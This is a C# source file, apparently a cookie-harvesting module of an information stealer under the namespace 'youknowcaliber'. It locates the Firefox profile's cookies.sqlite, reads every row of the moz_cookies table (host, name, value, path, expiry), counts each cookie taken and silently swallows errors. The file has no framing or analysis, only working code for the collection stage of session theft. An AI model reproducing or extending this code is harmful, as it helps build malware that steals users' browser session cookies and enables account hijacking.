﻿using System;
using System.Collections.Generic;
using System.IO;

namespace youknowcaliber.Cookies
{
	internal sealed class cCookies
	{
		private static string GetCookiesDBPath(string path)
		{
			try
			{
				string path2 = path + "\\Profiles";
				bool flag = Directory.Exists(path2);
				if (flag)
				{
					foreach (string str in Directory.GetDirectories(path2))
					{
						bool flag2 = File.Exists(str + "\\cookies.sqlite");
						if (flag2)
						{
							return str + "\\cookies.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		public static List<Cookie> Get(string path)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				string cookiesDBPath = cCookies.GetCookiesDBPath(path);
				SQLite sqlite = SqlReader.ReadTable(cookiesDBPath, "moz_cookies");
				bool flag = sqlite == null;
				if (flag)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Cookie item = default(Cookie);
					item.sHostKey = sqlite.GetValue(i, 4);
					item.sName = sqlite.GetValue(i, 2);
					item.sValue = sqlite.GetValue(i, 3);
					item.sPath = sqlite.GetValue(i, 5);
					item.sExpiresUtc = sqlite.GetValue(i, 6);
					Counting.Cookies++;
					list.Add(item);
				}
				return list;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return new List<Cookie>();
		}
	}
}
